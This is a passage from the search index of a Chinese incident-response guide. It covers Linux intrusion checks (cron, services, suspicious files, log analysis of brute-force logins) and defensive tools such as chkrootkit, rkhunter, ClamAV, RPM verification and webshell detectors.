\u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a /1 * echo \"hello world\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528anacron\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh\u811a\u672c\uff1a vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002 \u5165\u4fb5\u6392\u67e5 \u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u811a\u672c /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* \u5c0f\u6280\u5de7\uff1a more /etc/cron.daily/* \u67e5\u770b\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6","title":"1.6 \u68c0\u67e5\u5b9a\u65f6\u4efb\u52a1"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#17","text":"\u670d\u52a1\u81ea\u542f\u52a8 \u7b2c\u4e00\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a chkconfig [--level \u8fd0\u884c\u7ea7\u522b] [\u72ec\u7acb\u670d\u52a1\u540d] [on|off] chkconfig \u2013level 2345 httpd on \u5f00\u542f\u81ea\u542f\u52a8 chkconfig httpd on \uff08\u9ed8\u8ba4level\u662f2345\uff09 \u7b2c\u4e8c\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4fee\u6539/etc/re.d/rc.local \u6587\u4ef6 \u52a0\u5165 /etc/init.d/httpd start \u7b2c\u4e09\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4f7f\u7528ntsysv\u547d\u4ee4\u7ba1\u7406\u81ea\u542f\u52a8\uff0c\u53ef\u4ee5\u7ba1\u7406\u72ec\u7acb\u670d\u52a1\u548cxinetd\u670d\u52a1\u3002 \u5165\u4fb5\u6392\u67e5 1\u3001\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u670d\u52a1\uff1a RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 chkconfig --list \u67e5\u770b\u670d\u52a1\u81ea\u542f\u52a8\u72b6\u6001\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 ps aux | grep crond \u67e5\u770b\u5f53\u524d\u670d\u52a1 \u7cfb\u7edf\u57283\u4e0e5\u7ea7\u522b\u4e0b\u7684\u542f\u52a8\u9879 \u4e2d\u6587\u73af\u5883 chkconfig --list | grep \"3:\u542f\u7528\\|5:\u542f\u7528\" \u82f1\u6587\u73af\u5883 chkconfig --list | grep \"3:on\\|5:on\" \u6e90\u7801\u5305\u5b89\u88c5\u7684\u670d\u52a1 \u67e5\u770b\u670d\u52a1\u5b89\u88c5\u4f4d\u7f6e \uff0c\u4e00\u822c\u662f\u5728/user/local/ service httpd start \u641c\u7d22/etc/rc.d/init.d/ \u67e5\u770b\u662f\u5426\u5b58\u5728","title":"1.7 \u68c0\u67e5\u670d\u52a1"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#18","text":"1\u3001\u67e5\u770b\u654f\u611f\u76ee\u5f55\uff0c\u5982/tmp\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u540c\u65f6\u6ce8\u610f\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4ee5\u201c..\u201d\u4e3a\u540d\u7684\u6587\u4ef6\u5939\u5177\u6709\u9690\u85cf\u5c5e\u6027 2\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f \u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u6765\u67e5\u627e\uff0c\u5982 find /opt -iname \"*\" -atime 1 -type f \u627e\u51fa /opt \u4e0b\u4e00\u5929\u524d\u8bbf\u95ee\u8fc7\u7684\u6587\u4ef6 3\u3001\u9488\u5bf9\u53ef\u7591\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528stat\u8fdb\u884c\u521b\u5efa\u4fee\u6539\u65f6\u95f4\u3002","title":"1.8 \u68c0\u67e5\u5f02\u5e38\u6587\u4ef6"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#19","text":"\u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now","title":"1.9 \u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x02_1","text":"","title":"0x02 \u5de5\u5177\u7bc7"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#21-rootkit","text":"chkrootkit \u7f51\u5740\uff1a http://www.chkrootkit.org \u4f7f\u7528\u65b9\u6cd5\uff1a wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #\u7f16\u8bd1\u5b8c\u6210\u6ca1\u6709\u62a5\u9519\u7684\u8bdd\u6267\u884c\u68c0\u67e5 ./chkrootkit rkhunter \u7f51\u5740\uff1a http://rkhunter.sourceforge.net \u4f7f\u7528\u65b9\u6cd5\uff1a Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c","title":"2.1 Rootkit\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#22_1","text":"Clamav ClamAV\u7684\u5b98\u65b9\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a http://www.clamav.net/download.html \u5b89\u88c5\u65b9\u5f0f\u4e00\uff1a 1\u3001\u5b89\u88c5zlib\uff1a wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #\u5b89\u88c5\u4e00\u4e0bgcc\u7f16\u8bd1\u73af\u5883\uff1a yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make && make install 2\u3001\u6dfb\u52a0\u7528\u6237\u7ec4clamav\u548c\u7ec4\u6210\u5458clamav\uff1a groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3\u3001\u5b89\u88c5Clamav tar \u2013zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4\u3001\u914d\u7f6eClamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5\u3001ClamAV \u4f7f\u7528\uff1a /opt/clamav/bin/freshclam \u5347\u7ea7\u75c5\u6bd2\u5e93 ./clamscan \u2013h \u67e5\u770b\u76f8\u5e94\u7684\u5e2e\u52a9\u4fe1\u606f ./clamscan -r /home \u626b\u63cf\u6240\u6709\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5c31\u4f7f\u7528 ./clamscan -r --bell -i /bin \u626b\u63cfbin\u76ee\u5f55\u5e76\u4e14\u663e\u793a\u6709\u95ee\u9898\u7684\u6587\u4ef6\u7684\u626b\u63cf\u7ed3\u679c \u5b89\u88c5\u65b9\u5f0f\u4e8c\uff1a #\u5b89\u88c5 yum install -y clamav #\u66f4\u65b0\u75c5\u6bd2\u5e93 freshclam #\u626b\u63cf\u65b9\u6cd5 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #\u626b\u63cf\u5e76\u6740\u6bd2 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #\u67e5\u770b\u65e5\u5fd7\u53d1\u73b0 cat /root/usrclamav.log |grep FOUND","title":"2.2 \u75c5\u6bd2\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#23-webshell","text":"linux\u7248\uff1a \u6cb3\u9a6cwebshell\u67e5\u6740\uff1ahttp://www.shellpub.com \u6df1\u4fe1\u670dWebshell\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177\uff1ahttp://edr.sangfor.com.cn/backdoor_detection.html","title":"2.3 webshell\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#24-rpm-check","text":"\u7cfb\u7edf\u5b8c\u6574\u6027\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305\uff0c\u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u4e86\uff1a ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\uff0c\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\uff0c\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \uff0c\u5982\u679c\u662f. (\u70b9) \u5219\u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002 \u9a8c\u8bc1\u5185\u5bb9\u4e2d\u76848\u4e2a\u4fe1\u606f\u7684\u5177\u4f53\u5185\u5bb9\u5982\u4e0b\uff1a S \u6587\u4ef6\u5927\u5c0f\u662f\u5426\u6539\u53d8 M \u6587\u4ef6\u7684\u7c7b\u578b\u6216\u6587\u4ef6\u7684\u6743\u9650\uff08rwx\uff09\u662f\u5426\u88ab\u6539\u53d8 5 \u6587\u4ef6MD5\u6821\u9a8c\u662f\u5426\u6539\u53d8\uff08\u53ef\u4ee5\u770b\u6210\u6587\u4ef6\u5185\u5bb9\u662f\u5426\u6539\u53d8\uff09 D \u8bbe\u5907\u4e2d\uff0c\u4ece\u4ee3\u7801\u662f\u5426\u6539\u53d8 L \u6587\u4ef6\u8def\u5f84\u662f\u5426\u6539\u53d8 U \u6587\u4ef6\u7684\u5c5e\u4e3b\uff08\u6240\u6709\u8005\uff09\u662f\u5426\u6539\u53d8 G \u6587\u4ef6\u7684\u5c5e\u7ec4\u662f\u5426\u6539\u53d8 T \u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6539\u53d8 \u5982\u679c\u547d\u4ee4\u88ab\u66ff\u6362\u4e86\uff0c\u5982\u679c\u8fd8\u539f\u56de\u6765\uff1a \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp \u5148\u628als\u8f6c\u79fb\u5230tmp\u76ee\u5f55\u4e0b\uff0c\u9020\u6210ls\u547d\u4ee4\u4e22\u5931\u7684\u5047\u8c61 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931","title":"2.4 RPM check\u68c0\u67e5"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#25-linux","text":"Github\u9879\u76ee\u5730\u5740\uff1a https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux \u5c3d\u4fe1\u4e66\u4e0d\u5982\u65e0\u4e66\uff0c\u5de5\u5177\u53ea\u662f\u8f85\u52a9\uff0c\u522b\u592a\u8fc7\u4e8e\u4f9d\u8d56\uff0c\u5173\u952e\u5728\u4e8e\u4f60\u5982\u4f55\u89e3\u51b3\u95ee\u9898\u7684\u601d\u8def\u3002","title":"2.5 linux\u5b89\u5168\u68c0\u67e5\u811a\u672c"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#3webshell","text":"\u5f53\u7f51\u7ad9\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3eWebshell\u68c0\u6d4b\u5de5\u5177\uff0c\u6765\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0webshell\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\u7cfb\u7edf\u53ef\u80fd\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 \u672c\u6587\u63a8\u8350\u4e8610\u6b3eWebshll\u68c0\u6d4b\u5de5\u5177\uff0c\u7528\u4e8e\u7f51\u7ad9\u5165\u4fb5\u6392\u67e5\u3002\u5f53\u7136\uff0c\u76ee\u524d\u5e02\u573a\u4e0a\u7684\u5f88\u591a\u4e3b\u673a\u5b89\u5168\u4ea7\u54c1\u4e5f\u90fd\u63d0\u4f9b\u8fd9\u79cdWebShell\u68c0\u6d4b\u80fd\u529b\uff0c\u6bd4\u5982\u963f\u91cc\u4e91\u3001\u9752\u85e4\u4e91\u3001safedog\u7b49\uff0c\u672c\u6587\u6682\u4e0d\u8ba8\u8bba\u3002 1\u3001D\u76fe_Web\u67e5\u6740 \u963fD\u51fa\u54c1\uff0c\u4f7f\u7528\u81ea\u884c\u7814\u53d1\u4e0d\u5206\u6269\u5c55\u540d\u7684\u4ee3\u7801\u5206\u6790\u5f15\u64ce\uff0c\u80fd\u5206\u6790\u66f4\u4e3a\u9690\u85cf\u7684WebShell\u540e\u95e8\u884c\u4e3a\u3002 \u517c\u5bb9\u6027\uff1a\u53ea\u63d0\u4f9bWindows\u7248\u672c\u3002 \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://www.d99net.net/down/WebShellKill_V2.0.9.zip 2\u3001\u767e\u5ea6WEBDIR+ \u4e0b\u4e00\u4ee3WebShell\u68c0\u6d4b\u5f15\u64ce\uff0c\u91c7\u7528\u5148\u8fdb\u7684\u52a8\u6001\u76d1\u6d4b\u6280\u672f\uff0c\u7ed3\u5408\u591a\u79cd\u5f15\u64ce\u96f6\u89c4\u5219\u67e5\u6740\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b\u5728\u7ebf\u67e5\u6740\u6728\u9a6c\uff0c\u514d\u8d39\u5f00\u653eAPI\u652f\u6301\u6279\u91cf\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a https://scanner.baidu.com/ 3\u3001\u6cb3\u9a6c \u4e13\u6ce8webshell\u67e5\u6740\u7814\u7a76\uff0c\u62e5\u6709\u6d77\u91cfwebshell\u6837\u672c\u548c\u81ea\u4e3b\u67e5\u6740\u6280\u672f\uff0c\u91c7\u7528\u4f20\u7edf\u7279\u5f81+\u4e91\u7aef\u5927\u6570\u636e\u53cc\u5f15\u64ce\u7684\u67e5\u6740\u6280\u672f\u3002\u67e5\u6740\u901f\u5ea6\u5feb\u3001\u7cbe\u5ea6\u9ad8\u3001\u8bef\u62a5\u4f4e\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301Windows\u3001linux\uff0c\u652f\u6301\u5728\u7ebf\u67e5\u6740\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a https://www.shellpub.com/ 4\u3001Web Shell Detector Webshell Detector\u5177\u6709\u201c Webshell\u201d\u7b7e\u540d\u6570\u636e\u5e93\uff0c\u53ef\u5e2e\u52a9\u8bc6\u522b\u9ad8\u8fbe99\uff05\u7684\u201c Webshell\u201d\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9bphp/python\u811a\u672c\uff0c\u53ef\u8de8\u5e73\u53f0\uff0c\u5728\u7ebf\u68c0\u6d4b\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a http://www.shelldetector.com/ github\u9879\u76ee\u5730\u5740\uff1a https://github.com/emposha/PHP-Shell-Detector 5\u3001CloudWalker\uff08\u7267\u4e91\uff09 \u4e00\u4e2a\u53ef\u6267\u884c\u7684\u547d\u4ee4\u884c\u7248\u672c Webshell \u68c0\u6d4b\u5de5\u5177\u3002\u76ee\u524d\uff0c\u9879\u76ee\u5df2\u505c\u6b62\u66f4\u65b0\u3002 \u517c\u5bb9\u6027\uff0c\u63d0\u4f9blinux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 \u5728\u7ebf\u67e5\u6740demo\uff1a https://webshellchop.chaitin.cn/ github\u9879\u76ee\u5730\u5740\uff1a https://github.com/chaitin/cloudwalker 6\u3001Sangfor WebShellKill Sangfor WebShellKill(\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177)\u662f\u4e00\u6b3eweb\u540e\u95e8\u4e13\u6740\u5de5\u5177\uff0c\u4e0d\u4ec5\u652f\u6301webshell\u7684\u626b\u63cf\uff0c\u540c\u65f6\u8fd8\u652f\u6301\u6697\u94fe\u7684\u626b\u63cf\u3002\u662f\u4e00\u6b3e\u878d\u5408\u4e86\u591a\u91cd\u68c0\u6d4b\u5f15\u64ce\u7684\u67e5\u6740\u5de5\u5177\u3002\u80fd\u66f4\u7cbe\u51c6\u5730\u68c0\u6d4b\u51faWEB\u7f51\u7ad9\u5df2\u77e5\u548c\u672a\u77e5\u7684\u540e\u95e8\u6587\u4ef6\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301Windows\u3001linux \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://edr.sangfor.com.cn/backdoor_detection.html \uff08\u5df2\u505c\u6b62\u8bbf\u95ee\uff09 7\u3001\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b\u68c0\u6d4bPHP Webshell \u4e00\u4e2a\u6df1\u5ea6\u5b66\u4e60PHP webshell\u67e5\u6740\u5f15\u64cedemo\uff0c\u63d0\u4f9b\u5728\u7ebf\u6837\u672c\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://webshell.cdxy.me/ 8\u3001PHP Malware Finder PHP-malware-finder \u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u68c0\u6d4bwebshell\u548c\u6076\u610f\u8f6f\u4ef6\u6df7\u6dc6\u4ee3\u7801\u7684\u5de5\u5177 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9blinux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/jvoisin/php-malware-finder 9\u3001findWebshell \u8fd9\u4e2a\u9879\u76ee\u662f\u4e00\u6b3e\u57fa\u4e8epython\u5f00\u53d1\u7684webshell\u68c0\u67e5\u5de5\u5177\uff0c\u53ef\u4ee5\u6839\u636e\u7279\u5f81\u7801\u5339\u914d\u68c0\u67e5\u4efb\u610f\u7c7b\u578b\u7684webshell\u540e\u95e8\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/he1m4n6a/findWebshell 10\u3001\u5728\u7ebfwebshell\u67e5\u6740\u5de5\u5177 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://tools.bugscaner.com/killwebshell/","title":"\u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#4webshell","text":"\u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u7684\u7f51\u7ad9\u88ab\u5165\u4fb5\uff0c\u653b\u51fb\u8005\u7559\u4e0b\u9690\u85cf\u7684\u540e\u95e8\uff0c\u4f60\u771f\u7684\u90fd\u53ef\u4ee5\u627e\u51fa\u6765\u561b\uff1f\u9762\u5bf9\u4e00\u4e2a\u5927\u4e2d\u578b\u7684\u5e94\u7528\u7cfb\u7edf\uff0c\u6570\u4ee5\u767e\u4e07\u7ea7\u7684\u4ee3\u7801\u884c\uff0c\u662f\u4e0d\u53ef\u80fd\u505a\u5230\u6bcf\u4e2a\u6587\u4ef6\u6bcf\u6bb5\u4ee3\u7801\u8fdb\u884c\u624b\u5de5\u68c0\u67e5\u7684\u3002 